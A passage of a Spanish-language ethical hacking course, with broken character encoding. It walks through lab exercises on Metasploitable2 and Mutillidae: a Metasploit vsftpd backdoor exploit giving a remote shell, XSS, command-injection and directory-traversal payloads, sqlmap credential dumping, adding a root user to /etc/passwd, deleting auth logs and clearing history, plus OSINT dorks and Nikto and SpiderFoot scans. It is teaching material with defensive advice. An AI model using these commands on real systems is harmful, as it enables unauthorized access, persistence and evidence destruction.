- Puedes usar la versiÃ³n en formato `.ova` (fÃ¡cil de importar).

---

#### ğŸ”¹ Paso 3: Descargar Metasploitable2

1. Ve a:
   [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)
2. Descarga el archivo ZIP y descomprÃ­melo. DeberÃ­as obtener archivos como:

   - `Metasploitable.vmdk`
   - `Metasploitable.vmx`

---

#### ğŸ”¹ Paso 4: Crear una mÃ¡quina virtual para Metasploitable

En VirtualBox:

1. Clic en **"Nueva"**.
2. Nombre: `Metasploitable2`
3. Tipo: **Linux**
4. VersiÃ³n: **Ubuntu (32-bit)**
5. RAM: al menos 512 MB
6. Disco duro: elige â€œusar un disco existenteâ€ y selecciona `Metasploitable.vmdk`.

---

#### ğŸ”¹ Paso 5: Configura red en ambas mÃ¡quinas (Kali y Metasploitable)

Para que Kali pueda atacar a Metasploitable, deben estar en la **misma red**:

1. Ve a **ConfiguraciÃ³n âœ Red**
2. Elige **Adaptador puente** o **Red interna** en ambas mÃ¡quinas.

   - Adaptador puente: ambas usan la red real de tu casa.
   - Red interna: red cerrada entre ambas mÃ¡quinas.

---

#### ğŸ”¹ Paso 6: Inicia Kali y Metasploitable

- Kali: usuario/contraseÃ±a suele ser `kali/kali`.
- Metasploitable: usuario `msfadmin`, contraseÃ±a `msfadmin`.

---

#### ğŸ”¹ Paso 7: Verifica que ambas mÃ¡quinas se ven

Desde Kali, abre terminal y escribe:

```bash
ping 192.168.1.105
```

(Suponiendo que Metasploitable tiene esa IP, puedes verla con `ifconfig` en Metasploitable)

---

### ğŸ§ª EJEMPLO COMPLETO: Explotar una vulnerabilidad con Metasploit

ğŸ¯ **Objetivo**: Usar Metasploit desde Kali para atacar a Metasploitable2.

---

#### Paso 1: Escanear puertos con Nmap

```bash
nmap -sS -sV 192.168.1.105
```

Salida tÃ­pica:

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
22/tcp   open  ssh        OpenSSH 4.7p1
...
```

> El FTP `vsftpd 2.3.4` es **vulnerable** a ejecuciÃ³n remota.

---

#### Paso 2: Abrir Metasploit en Kali

```bash
msfconsole
```

---

#### Paso 3: Buscar exploit para vsftpd 2.3.4

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Usar el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 5: Configurar la IP de la vÃ­ctima

```bash
set RHOSTS 192.168.1.105
```

---

#### Paso 6: Ejecutar el ataque

```bash
run
```

Resultado:

```
[*] Command shell session opened!
```

Â¡Tienes una **shell remota** sobre el sistema Metasploitable!

---

#### Paso 7: Explorar el sistema

Ya puedes escribir comandos como si estuvieras dentro del sistema:

```bash
whoami
ls
uname -a
```

---

### ğŸ§  Â¿QuÃ© aprendiste?

- CÃ³mo instalar **Metasploitable2**.
- CÃ³mo escanearlo con **Nmap**.
- CÃ³mo explotarlo con **Metasploit**.
- Que **un servicio obsoleto (FTP)** puede permitir acceso total a un atacante.

---

### ğŸ›¡ï¸ Â¿CÃ³mo se previenen estos ataques?

| Ataque usado          | PrevenciÃ³n                                                   |
| --------------------- | ------------------------------------------------------------ |
| FTP vulnerable        | Usar versiones actualizadas, cifradas y cerradas al pÃºblico. |
| ExposiciÃ³n de puertos | Usar firewalls y escaneo preventivo (como Nessus).           |
| Acceso remoto         | Seguir el principio de mÃ­nimo privilegio.                    |

---

### ğŸ“š Recursos para seguir practicando

| Recurso                 | Enlace                                                                                               |
| ----------------------- | ---------------------------------------------------------------------------------------------------- |
| Metasploitable2         | [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/) |
| Curso prÃ¡ctico          | [https://tryhackme.com](https://tryhackme.com)                                                       |
| Metasploit guÃ­a oficial | [https://docs.rapid7.com/metasploit/](https://docs.rapid7.com/metasploit/)                           |

---

[ğŸ”¼](#Ã­ndice)

---

## **865. PrÃ¡ctica: Cross-Site-Scripting, command injection y directorio transversal**

### ğŸ§  1. Â¿QuÃ© es Cross-Site Scripting (XSS)?

#### â“ DefiniciÃ³n:

Es una vulnerabilidad que permite al atacante **inyectar scripts maliciosos (JavaScript)** en pÃ¡ginas web que otros usuarios verÃ¡n.

> Esto puede permitir robar cookies, sesiones o redirigir usuarios a sitios falsos.

---

#### ğŸ§ª Ejemplo sencillo de XSS:

Si un formulario permite escribir tu nombre y devuelve:

```html
Hola <tu_nombre></tu_nombre>
```

Y tÃº escribes:

```html
<script>
  alert("Â¡Hackeado!");
</script>
```

Y la pÃ¡gina muestra:

```html
Hola
<script>
  alert("Â¡Hackeado!");
</script>
```

Entonces se ejecuta el `alert()` â‡’ Esto es un XSS.

---

### ğŸ§  2. Â¿QuÃ© es Command Injection?

#### â“ DefiniciÃ³n:

Es cuando un atacante **inyecta comandos del sistema operativo** en formularios web mal protegidos.

> Esto puede permitir ejecutar `ls`, `cat`, `rm`, etc. en el servidor.

---

#### ğŸ§ª Ejemplo bÃ¡sico de Command Injection:

Si hay un campo que dice "Ingresa una IP para hacer ping", y tÃº escribes:

```bash
127.0.0.1; ls
```

Y el servidor ejecuta:

```bash
ping 127.0.0.1; ls
```

Entonces mostrarÃ¡ archivos del servidor â‡’ Esto es Command Injection.

---

### ğŸ§  3. Â¿QuÃ© es Directory Traversal (Recorrido de directorios)?

#### â“ DefiniciÃ³n:

Es una vulnerabilidad que permite al atacante **navegar fuera del directorio web permitido** y acceder a archivos sensibles.

---

#### ğŸ§ª Ejemplo simple:

La URL:

```
http://victima.com/ver_archivo.php?file=manual.txt
```

Si cambias el parÃ¡metro a:

```
file=../../../../etc/passwd
```

PodrÃ­as ver el archivo `/etc/passwd` del sistema â‡’ Esto es Directory Traversal.

---

### âœ… InstalaciÃ³n del entorno de pruebas: Mutillidae

Ya que Mutillidae incluye todas estas vulnerabilidades, usaremos **Kali Linux** + **Mutillidae**.

---

#### ğŸ”¹ Paso 1: Instala Apache, PHP y Git en Kali Linux

```bash
sudo apt update
sudo apt install apache2 php php-mysqli git mariadb-server -y
```

---

#### ğŸ”¹ Paso 2: Clona Mutillidae

```bash
cd /var/www/html
sudo git clone https://github.com/webpwnized/mutillidae.git
sudo chown -R www-data:www-data mutillidae
```

---

#### ğŸ”¹ Paso 3: Inicia Apache y MariaDB

```bash
sudo systemctl start apache2
sudo systemctl start mariadb
```

---

#### ğŸ”¹ Paso 4: Configura la base de datos

Accede desde el navegador en Kali:

```
http://localhost/mutillidae
```

Haz clic en **"Setup/Reset the DB"** para inicializar la base de datos.

---

#### ğŸ”¹ Paso 5: Baja la seguridad para practicar

En el menÃº izquierdo de Mutillidae:

```
Toggle Hints âœ Yes
Toggle Security âœ Set to Low
```

---

### ğŸ§ª EJEMPLOS COMPLETOS

---

#### âœ… EJEMPLO 1: XSS (Cross-Site Scripting)

1. En el menÃº izquierdo:
   `OWASP Top 10 âœ A7 - XSS âœ Reflected (GET)`
   URL:

   ```
   http://localhost/mutillidae/index.php?page=xss-reflected.php
   ```

2. En el campo de texto, escribe:

```html
<script>
  alert("XSS funcionando");
</script>
```

3. Presiona â€œGoâ€ y verÃ¡s una ventana emergente.

âœ… **Exploit exitoso de XSS Reflejado**

---

#### âœ… EJEMPLO 2: Command Injection

1. En el menÃº:
   `OWASP Top 10 âœ A1 - Injection âœ OS Command Injection`

2. VerÃ¡s un campo para ingresar una direcciÃ³n IP. Escribe:

```bash
127.0.0.1; ls
```

3. Haz clic en â€œPingâ€.

VerÃ¡s la salida del ping **mÃ¡s un listado de archivos del servidor web**. Â¡Eso significa que pudiste ejecutar comandos!

âœ… **Command Injection exitoso**

---

#### âœ… EJEMPLO 3: Directory Traversal

1. En el menÃº:
   `OWASP Top 10 âœ A5 - Security Misconfiguration âœ Directory Browsing`

2. URL del ejemplo:

```
http://localhost/mutillidae/index.php?page=directory-traversal.php
```

3. En el campo de archivo, escribe:

```bash
../../../../etc/passwd
```

4. Presiona â€œSubmitâ€

VerÃ¡s el contenido del archivo `/etc/passwd`, que contiene usuarios del sistema Linux.

âœ… **Directory Traversal exitoso**

---

### ğŸ§  Â¿QuÃ© aprendiste?

- **XSS** permite ejecutar scripts en el navegador de otros.
- **Command Injection** permite ejecutar comandos del sistema en el servidor.
- **Directory Traversal** permite leer archivos sensibles fuera del directorio web.

---

### ğŸ›¡ï¸ Â¿CÃ³mo se protegen estas vulnerabilidades?

| Vulnerabilidad      | ProtecciÃ³n recomendada                                                                |
| ------------------- | ------------------------------------------------------------------------------------- |
| XSS                 | Escapar y sanitizar entradas (HTML entities).                                         |
| Command Injection   | Validar entradas y usar funciones seguras (`escapeshellcmd`, `parametrizaciÃ³n`).      |
| Directory Traversal | Validar rutas, usar `realpath()`, restringir el acceso fuera de carpetas especÃ­ficas. |

---

### ğŸ“š Recursos para seguir practicando

- ğŸ§ª [https://tryhackme.com](https://tryhackme.com)
- ğŸ§ª [https://owasp.org/www-project-mutillidae-ii/](https://owasp.org/www-project-mutillidae-ii/)
- ğŸ’» Curso gratuito de OWASP: [https://owasp.org/Top10/](https://owasp.org/Top10/)

---

[ğŸ”¼](#Ã­ndice)

---

## **866. Fases del hacking**

![Fases del hacking*](../img/7_Ciberseguridad_Profesional/Fases_del_hacking.webp "Fases del hacking*")

### ğŸ§  Â¿QuÃ© son las fases del hacking?

Las **fases del hacking** son los pasos que sigue un hacker Ã©tico (o malicioso) para **comprometer un sistema** o **evaluar su seguridad**.

Estas fases son parte de una **metodologÃ­a estructurada**, que permite:

- Identificar vulnerabilidades
- Explorar vectores de ataque
- Obtener acceso no autorizado
- Mantener el acceso
- Borrar evidencias

---

### ğŸ§­ Las 5 fases del hacking Ã©tico

---

#### ğŸ” 1. **Reconocimiento (Reconnaissance)**

Es la **fase de recolecciÃ³n de informaciÃ³n**. AquÃ­ el atacante busca obtener toda la informaciÃ³n posible del objetivo **sin interactuar directamente** con Ã©l (pasiva) o **interactuando directamente** (activa).

##### Ejemplos:

- BÃºsqueda de IPs, dominios, subdominios, correos.
- InformaciÃ³n pÃºblica en redes sociales o sitios web.
- Whois, Google hacking, DNSdumpster, Shodan.

##### Herramientas:

- `whois`, `nslookup`, `theHarvester`, `recon-ng`

---

#### ğŸŒ 2. **Escaneo (Scanning)**

AquÃ­ el atacante **detecta puertos abiertos, servicios y sistemas operativos**. Es como "mapear" el sistema objetivo.

##### Ejemplos:

- Escanear puertos abiertos en una IP.
- Detectar si hay un servidor web, FTP o SSH funcionando.
- Identificar vulnerabilidades en servicios detectados.

##### Herramientas:

- `nmap`, `masscan`, `nikto`, `OpenVAS`

---

#### ğŸ¯ 3. **Acceso (Gaining Access)**

El atacante **explota vulnerabilidades** descubiertas en la fase de escaneo para **tomar el control del sistema o aplicaciÃ³n**.

##### Ejemplos:

- InyecciÃ³n SQL para obtener contraseÃ±as.
- Explotar un servicio vulnerable con Metasploit.
- XSS para robar sesiones.

##### Herramientas:

- `Metasploit`, `sqlmap`, `burp suite`, `hydra`, `exploit-db`

---

#### ğŸ› ï¸ 4. **Mantener el acceso (Maintaining Access)**

Una vez dentro, el atacante busca **mantener el acceso** para seguir explotando el sistema.

##### Ejemplos:

- Crear un usuario oculto.
- Instalar una puerta trasera (backdoor).
- Usar un rootkit o shell persistente.

##### Herramientas:

- `netcat`, `msfvenom`, `backdoor-apk`, `persistence scripts`

---

#### ğŸ§¹ 5. **Cubrir rastros (Clearing Tracks)**

El atacante borra evidencias de su presencia para **evitar ser detectado**.

##### Ejemplos:

- Borrar logs del sistema (`/var/log/auth.log`)
- Modificar timestamps de archivos.
- Eliminar shells o scripts usados.

##### Herramientas:

- Comandos de Linux (`shred`, `rm`, `touch`), `Metasploit`, `logcleaner`

---

### ğŸ”§ InstalaciÃ³n de herramientas para cada fase (en Kali Linux)

Kali ya viene con muchas herramientas preinstaladas, pero puedes asegurarte de tener:

```bash
sudo apt update && sudo apt install nmap sqlmap metasploit-framework hydra theharvester nikto -y
```

---

### âœ… EJEMPLO COMPLETO PASO A PASO

ğŸ¯ **Objetivo:** Hacer un mini pentest a una mÃ¡quina virtual vulnerable llamada **Metasploitable 2** (puedes usar VirtualBox o VMware).

---

#### ğŸ‘£ Paso 1: Reconocimiento

```bash
theharvester -d metasploitable.local -l 100 -b all
```

> ğŸ” Obtiene correos, hosts, y nombres pÃºblicos.

---

#### ğŸ‘£ Paso 2: Escaneo

```bash
nmap -sS -sV -O 192.168.56.101
```

> ğŸ” Detecta puertos abiertos y servicios. Por ejemplo, FTP, SSH, MySQL, Apache.

---

#### ğŸ‘£ Paso 3: Acceso

Detectas que el servicio FTP (puerto 21) **permite acceso anÃ³nimo**:

```bash
ftp 192.168.56.101
# Usuario: anonymous
```

Â¡Ya estÃ¡s dentro del sistema!

---

O encuentras una vulnerabilidad en un servicio con Metasploit:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
run
```

âœ… Obtienes una shell como root.

---

#### ğŸ‘£ Paso 4: Mantener el acceso

```bash
netcat -lvp 4444 > shell.sh
```

O subes un script para crear un usuario:

```bash
echo "user:x:0:0::/root:/bin/bash" >> /etc/passwd
```

---

#### ğŸ‘£ Paso 5: Cubrir rastros

```bash
rm -f /var/log/auth.log
history -c
```

---

### ğŸ›¡ï¸ Recuerda: Â¡Solo practicar en entornos controlados!

**Nunca hagas pruebas en redes o sitios que no sean tuyos o no tengas autorizaciÃ³n.**
Hazlo en laboratorios como:

- ğŸ” [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- ğŸ” [TryHackMe](https://tryhackme.com/)
- ğŸ” [Hack The Box](https://www.hackthebox.com/)

---

### ğŸ§  Resumen grÃ¡fico de las fases

```
1ï¸âƒ£ Reconocimiento  â†’  2ï¸âƒ£ Escaneo  â†’  3ï¸âƒ£ Acceso  â†’  4ï¸âƒ£ Persistencia  â†’  5ï¸âƒ£ Cubrir Huellas
```

---

[ğŸ”¼](#Ã­ndice)

---

## **867. Tipos de hacking**

### ğŸ§  Â¿QuÃ© es el hacking?

El **hacking** es el proceso de **manipular sistemas informÃ¡ticos** para lograr un objetivo determinado. Dependiendo de la **intenciÃ³n** del hacker, el hacking puede ser **Ã©tico (legal)** o **malicioso (ilegal)**.

---

### ğŸ¯ Tipos de hacking (segÃºn el "sombrero" del hacker)

Los hackers se clasifican comÃºnmente por **colores de sombrero**, como si fueran personajes en una historia:

---

#### ğŸŸ¢ 1. Hacker de sombrero blanco (White Hat)

- **Son los hackers Ã©ticos.**
- Usan sus habilidades para **proteger sistemas**, detectar vulnerabilidades y ayudar a empresas.
- Trabajan como **pentesters, analistas de seguridad, investigadores**.
- ActÃºan **con autorizaciÃ³n legal**.

ğŸ“Œ **Ejemplo**:

- Un especialista en seguridad contratado para hackear un sistema y encontrar debilidades antes de que lo haga un atacante real.

---

#### âš« 2. Hacker de sombrero negro (Black Hat)

- Son los hackers **maliciosos**.
- Buscan **robar datos, daÃ±ar sistemas, extorsionar, instalar malware, etc.**
- ActÃºan **ilegalmente y sin permiso**.

ğŸ“Œ **Ejemplo**:

- Un atacante que entra a una base de datos y roba nÃºmeros de tarjetas de crÃ©dito para venderlos en la dark web.

---

#### âšªâš« 3. Hacker de sombrero gris (Grey Hat)

- EstÃ¡n **en medio** de los anteriores.
- Pueden vulnerar sistemas **sin autorizaciÃ³n**, pero **sin intenciÃ³n maliciosa**.
- A veces informan al dueÃ±o del sistema. Otras veces, piden una recompensa.

ğŸ“Œ **Ejemplo**:

- Un hacker que encuentra una falla en un sistema y notifica al dueÃ±o, pero sin permiso previo.

---

#### ğŸŸ  4. Hacktivista

- Utiliza el hacking con **fines polÃ­ticos o sociales**.
- Sus acciones pueden ser legales o ilegales segÃºn el caso.
- Objetivo: **protestar, denunciar o defender una causa**.

ğŸ“Œ **Ejemplo**:

- Grupo Anonymous atacando sitios de gobiernos o empresas que consideran corruptas o injustas.

---

#### ğŸ’» 5. Script Kiddie

- Hackers **sin conocimientos profundos**.
- Usan herramientas y scripts creados por otros.
- Buscan fama o diversiÃ³n sin saber bien lo que hacen.

ğŸ“Œ **Ejemplo**:

- Alguien que descarga un programa de "hacking de Facebook" y lo ejecuta sin entender cÃ³mo funciona.

---

#### ğŸ‘©â€ğŸ’» 6. Hacker de sombrero azul (Blue Hat)

- Hackers que **vengan una ofensa personal**, o **testean sistemas de seguridad** antes del lanzamiento (a veces confundido con el red team externo).
- En algunos casos trabajan para empresas en **bug bounty**.

ğŸ“Œ **Ejemplo**:

- Un hacker contratado para probar la seguridad de una app antes de su salida oficial.

---

#### ğŸ”µ 7. Hacker de sombrero rojo (Red Hat)

- ActÃºan como **White Hats**, pero con una actitud mÃ¡s **agresiva y ofensiva** contra Black Hats.
- Su objetivo: **detener a los hackers maliciosos**, incluso hackeÃ¡ndolos de vuelta.

ğŸ“Œ **Ejemplo**:

- Un experto en seguridad que encuentra un servidor de un atacante y lo inhabilita.

---

### ğŸ§ª Â¿CÃ³mo instalar un entorno para practicar hacking Ã©tico?

Usaremos **Kali Linux** en VirtualBox, ya que Kali es la distro mÃ¡s usada por hackers Ã©ticos.

---

#### âœ… Requisitos:

- [ ] PC con al menos 4GB RAM y 20GB libres.
- [ ] VirtualBox instalado (o VMware).
- [ ] Imagen ISO de Kali Linux:
      ğŸ”— [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

---

#### âœ… Pasos para instalar Kali Linux en VirtualBox:

1. **Descarga Kali ISO** desde el sitio oficial.
2. Abre VirtualBox â†’ "Nueva mÃ¡quina virtual".
3. Asigna:

   - Nombre: Kali
   - Tipo: Linux
   - VersiÃ³n: Debian 64-bit
   - RAM: al menos 2 GB
   - Disco duro: 20 GB (tipo VDI, reservado dinÃ¡micamente)

4. Monta la ISO de Kali y arranca la VM.
5. Sigue los pasos de instalaciÃ³n de Kali como cualquier Linux.
6. Al iniciar sesiÃ³n, ya tendrÃ¡s acceso a herramientas como:

   - Nmap, Metasploit, Wireshark, Burp Suite, sqlmap, etc.

---

### âœ… Ejemplo completo: White Hat vs Black Hat

Imaginemos una empresa con una aplicaciÃ³n vulnerable llamada **Mutillidae** (instalada en Metasploitable 2).
Te contratan como hacker Ã©tico (White Hat) para **evaluar la seguridad del sitio web**.

---

#### ğŸ”¹ Fase 1: Reconocimiento

```bash
whois empresa.com
nslookup empresa.com
```

---

#### ğŸ”¹ Fase 2: Escaneo

```bash
nmap -sV -A 192.168.56.101
```

Encuentras puerto 80 abierto, servidor Apache.

---

#### ğŸ”¹ Fase 3: ExplotaciÃ³n

Encuentras una **vulnerabilidad de inyecciÃ³n SQL** en el login.

Con `sqlmap`:

```bash
sqlmap -u "http://192.168.56.101/mutillidae/index.php?page=login.php" --data="username=admin&password=123" --dump
```

Obtienes los usuarios y contraseÃ±as.

---

#### ğŸ”¹ Fase 4: Reporte

TÃº como hacker Ã©tico **documentas el hallazgo**, recomiendas sanitizar inputs y usar prepared statements.

âœ… **Hiciste un hacking legal (White Hat).**

Pero si en vez de eso **vendieras las contraseÃ±as en la dark web**, serÃ­as un hacker de sombrero negro (Black Hat).

---

### ğŸ›¡ï¸ Â¿CÃ³mo convertirte en hacker Ã©tico?

1. Aprende sobre redes, sistemas operativos, programaciÃ³n.
2. Practica en laboratorios como:

   - [TryHackMe](https://tryhackme.com)
   - [Hack The Box](https://www.hackthebox.com)
   - MÃ¡quinas vulnerables como Metasploitable y DVWA.

3. Estudia certificaciones como:

   - CEH (Certified Ethical Hacker)
   - OSCP (Offensive Security Certified Professional)

---

### ğŸ§  Resumen:

| Tipo de hacker   | IntenciÃ³n         | Legalidad    | Ejemplo                         |
| ---------------- | ----------------- | ------------ | ------------------------------- |
| ğŸŸ¢ White Hat     | Ã‰tica             | Legal        | Pentester contratado            |
| âš« Black Hat     | Maliciosa         | Ilegal       | LadrÃ³n de datos                 |
| âšªâš« Grey Hat    | Mixta             | Depende      | Hackea sin permiso pero no daÃ±a |
| ğŸŸ  Hacktivista   | Protesta          | Ilegal/legal | Anonymous                       |
| ğŸ§‘â€ğŸ’» Script Kiddie | DiversiÃ³n         | Ilegal       | Usa scripts de otros sin saber  |
| ğŸ”µ Blue Hat      | Testeo o venganza | Depende      | Pruebas antes del lanzamiento   |
| ğŸ”´ Red Hat       | Defensa ofensiva  | Mixta        | Hackea a los hackers            |

---

[ğŸ”¼](#Ã­ndice)

---

## **868. PrÃ¡ctica: Obteniendo informaciÃ³n de fuentes abiertas con OSINT Framework y Google hacking**

### ğŸ” Â¿QuÃ© es OSINT?

**OSINT (Open Source Intelligence)** es la recopilaciÃ³n de informaciÃ³n pÃºblica y gratuita, accesible legalmente, para analizar personas, empresas, dominios, redes sociales, etc.

#### Ejemplos de fuentes OSINT:

- Sitios web
- Redes sociales
- Google
- Dominios y registros DNS
- Noticias
- Foros y bases de datos pÃºblicas

---

### ğŸ¯ Â¿Para quÃ© sirve OSINT?

- **Hacking Ã©tico / pentesting**: buscar informaciÃ³n que pueda facilitar un ataque.
- **CiberinvestigaciÃ³n / forense digital**: rastrear estafadores, cibercriminales.
- **InvestigaciÃ³n empresarial o personal**: analizar competencia, reputaciÃ³n, amenazas.
- **IngenierÃ­a social**: entender mejor a los objetivos antes de un ataque simulado.

---

### ğŸ§  Herramientas clave:

1. ğŸ•¸ï¸ **OSINT Framework**
2. ğŸ” **Google Hacking (Google Dorks)**

---

### ğŸ› ï¸ InstalaciÃ³n y uso de OSINT Framework

#### ğŸ”— Â¿QuÃ© es OSINT Framework?

Es un **sitio web organizado por categorÃ­as** que enlaza a cientos de herramientas OSINT, para:

- Buscar correos
- Rastrear IPs
- Analizar redes sociales
- Investigar personas o empresas
- Buscar leaks y metadatos

#### âœ… CÃ³mo usarlo:

No requiere instalaciÃ³n. Solo necesitas un navegador.

1. Ve a:
   ğŸ”— [https://osintframework.com/](https://osintframework.com/)

2. Explora por categorÃ­as:

   - Username
   - E-mail address
   - Metadata
   - Social Networks
   - Domains
   - Leaks

3. Haz clic en cualquier opciÃ³n. Por ejemplo:

   - **Username â†’ Knowem** te lleva a una web que busca ese usuario en mÃ¡s de 100 redes sociales.

---

### ğŸ” Â¿QuÃ© es Google Hacking o Google Dorks?

Son **comandos avanzados de bÃºsqueda en Google** que te permiten encontrar informaciÃ³n sensible u oculta que normalmente no aparecerÃ­a.

#### âœ… Ejemplos de Google Dorks:

| Dork                    | QuÃ© hace                           |
| ----------------------- | ---------------------------------- |
| `site:example.com`      | Busca solo dentro de ese sitio     |
| `intitle:index.of`      | Muestra directorios abiertos       |
| `filetype:pdf`          | Busca solo archivos PDF            |
| `inurl:login`           | Busca URLs con la palabra login    |
| `ext:sql`               | Encuentra archivos `.sql`          |
| `password filetype:log` | Busca posibles contraseÃ±as en logs |

---

### âš™ï¸ Entorno de prÃ¡ctica OSINT

No necesitas instalar nada pesado. Solo:

- âœ… **Navegador web actualizado (Firefox, Chrome)**
- âœ… Kali Linux (opcional, si quieres usar herramientas como theHarvester o Maltego)
- âœ… Acceso a Internet

---

### ğŸ§ª Ejemplo completo de prÃ¡ctica OSINT

#### ğŸ¯ Objetivo: Obtener informaciÃ³n pÃºblica sobre un dominio y su dueÃ±o.

---

#### ğŸ§© Paso 1: Elegir un objetivo

Vamos a investigar el dominio ficticio:
`example.com`

> âš ï¸ Para practicar con un dominio real, escoge uno de tu propiedad o autorizado. No hagas esto sin permiso.

---

#### ğŸ” Paso 2: Usar Google Hacking (Google Dorks)

Abre Google y busca:

```bash
site:example.com
```

â†’ Muestra todas las pÃ¡ginas indexadas del sitio.

```bash
site:example.com filetype:pdf
```

â†’ Encuentra archivos PDF pÃºblicos en el sitio.

```bash
inurl:admin site:example.com
```

â†’ Intenta encontrar paneles de administraciÃ³n pÃºblicos.

```bash
intitle:index.of site:example.com
```

â†’ Busca directorios abiertos que podrÃ­an contener archivos sin protecciÃ³n.

---

#### ğŸ§© Paso 3: Usar OSINT Framework

Ve a: [https://osintframework.com/](https://osintframework.com/)

Explora:

1. **Domain Names â†’ WHOIS Records**

   - Selecciona `ViewDNS.info` o `Whois.domaintools.com`
   - Escribe `example.com` y obtÃ©n informaciÃ³n como:

     - Registrante
     - Correo asociado
     - Servidores DNS
     - IP del servidor

2. **Metadata â†’ Document Metadata**

   - Usa herramientas como `metagoofil` (en Kali) para buscar documentos con metadatos.

3. **Social Networks â†’ LinkedIn**

   - Busca perfiles que trabajen en la empresa para posibles objetivos de ingenierÃ­a social.

---

#### ğŸ§© Paso 4: Complementar con herramientas de Kali Linux (opcional)

ğŸ”§ **theHarvester**: recolecta correos, subdominios, nombres, etc.

```bash
theHarvester -d example.com -b google
```

ğŸ”§ **dnsenum**: enumera informaciÃ³n DNS de un dominio.

```bash
dnsenum example.com
```

ğŸ”§ **maltego** (requiere GUI): anÃ¡lisis visual de relaciones OSINT.

---

#### âœ… Resultado

Con solo herramientas pÃºblicas y legales, puedes obtener:

- Correos visibles asociados a la empresa
- Documentos mal expuestos
- Subdominios visibles
- Metadatos en archivos PDF o DOC
- Nombres de empleados en LinkedIn
- Paneles o formularios mal protegidos

Todo esto **sin tocar el sistema del objetivo**. Solo viendo lo que ya estÃ¡ pÃºblicamente expuesto.

---

### ğŸ›¡ï¸ Â¿QuÃ© se aprende con esta prÃ¡ctica?

âœ”ï¸ Lo peligroso que puede ser publicar cosas sin control

âœ”ï¸ CÃ³mo el atacante prepara sus vectores con OSINT

âœ”ï¸ Que la **informaciÃ³n pÃºblica puede ser usada para ataques dirigidos**

âœ”ï¸ Que un **White Hat** puede usar OSINT para prevenir brechas

---

### ğŸ§  Â¿Y ahora quÃ©?

Si quieres seguir con prÃ¡cticas OSINT mÃ¡s avanzadas:

ğŸ”— [https://tryhackme.com/room/introductiontointelligence](https://tryhackme.com/room/introductiontointelligence)

ğŸ”— [https://www.hackthebox.com/](https://www.hackthebox.com/)

ğŸ”— [https://osintdojo.com/](https://osintdojo.com/)

---

[ğŸ”¼](#Ã­ndice)

---

## **869. PrÃ¡ctica: Analizar un sitio web con Nikto y Spiderfoot**

### ğŸ§  Â¿QuÃ© es Nikto?

**Nikto** es un escÃ¡ner de vulnerabilidades web en lÃ­nea de comandos.
Sirve para detectar problemas en servidores web como:

- Archivos y directorios inseguros
- Errores de configuraciÃ³n del servidor
- Scripts antiguos y vulnerables
- Cabeceras mal configuradas
- Software obsoleto (como Apache, PHP, etc.)

---

### âš™ï¸ InstalaciÃ³n de Nikto (en Kali Linux o cualquier Linux)

En **Kali Linux**, **ya viene instalado por defecto**.
Si no lo tienes, instÃ¡lalo asÃ­:

```bash
sudo apt update
sudo apt install nikto -y
```

Verifica con:

```bash
nikto -Version
```

---

### ğŸ§  Â¿QuÃ© es SpiderFoot?

**SpiderFoot** es una herramienta de **OSINT automatizado**, que:

- Recolecta informaciÃ³n sobre un dominio, IP, persona o empresa
- Usa +200 fuentes de datos (Shodan, VirusTotal, Whois, etc.)
- Puede detectar correos filtrados, puertos abiertos, tecnologÃ­as usadas, etc.

---

### âš™ï¸ InstalaciÃ³n de SpiderFoot

#### OpciÃ³n 1: Ya instalado en Kali Linux

Ejecuta:

```bash
spiderfoot
```

Si no se ejecuta, instÃ¡lalo asÃ­ ğŸ‘‡

#### OpciÃ³n 2: Instalar manualmente desde GitHub

1. Clona el repositorio:

```bash
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
```

2. Instala los requisitos:

```bash
sudo apt install python3-pip
pip3 install -r requirements.txt
```

3. Ejecuta SpiderFoot en modo web:

```bash
python3 sf.py
```

Luego abre tu navegador y ve a:

ğŸ“ `http://127.0.0.1:5001`

---

### ğŸ” EJEMPLO COMPLETO: Analizar un sitio web con Nikto y SpiderFoot

Usaremos el sitio **[http://testphp.vulnweb.com](http://testphp.vulnweb.com)**, un sitio creado para prÃ¡cticas legales.

---

#### ğŸ”¹ PARTE 1: Escaneo con Nikto

Ejecuta en terminal:

```bash
nikto -h http://testphp.vulnweb.com
```

VerÃ¡s una salida como:

```
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Apache/2.2.8 appears to be outdated.
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5
+ OSVDB-3092: /admin/: This might be an administrative login page.
...
```

#### ğŸ§  Â¿QuÃ© detectÃ³ Nikto?

- El servidor usa versiones obsoletas de Apache y PHP
- Faltan cabeceras de seguridad
- Hay un `/admin/` que puede usarse para ataques de fuerza bruta
- Potenciales vulnerabilidades conocidas (OSVDB)

---

#### ğŸ”¹ PARTE 2: Escaneo con SpiderFoot

1. Abre SpiderFoot:

```bash
cd spiderfoot
python3 sf.py
```

2. Abre tu navegador y entra a:

```
http://127.0.0.1:5001
```

3. Crea un nuevo escaneo:

- Nombre: `Prueba sitio vulnerable`
- Target: `testphp.vulnweb.com`
- Marca â€œuse all modulesâ€ y presiona **Run Scan**

4. Espera unos minutos y revisa los resultados.

---

#### ğŸ“Š SpiderFoot te mostrarÃ¡:

- DirecciÃ³n IP del dominio
- InformaciÃ³n del servidor
- Subdominios relacionados
- Emails expuestos
- Rutas detectadas
- Problemas de configuraciÃ³n
- Detalles de registros DNS, WHOIS, ASN
- Enlaces filtrados en servicios OSINT

---

### ğŸ§  Â¿QuÃ© aprendiste con esta prÃ¡ctica?

âœ… Con **Nikto** detectaste configuraciones inseguras y versiones obsoletas

âœ… Con **SpiderFoot** recolectaste informaciÃ³n OSINT detallada

âœ… Ambos te ayudan a hacer un **reconocimiento inicial completo**

---

### ğŸ›¡ï¸ Â¿CÃ³mo proteger un sitio contra esto?

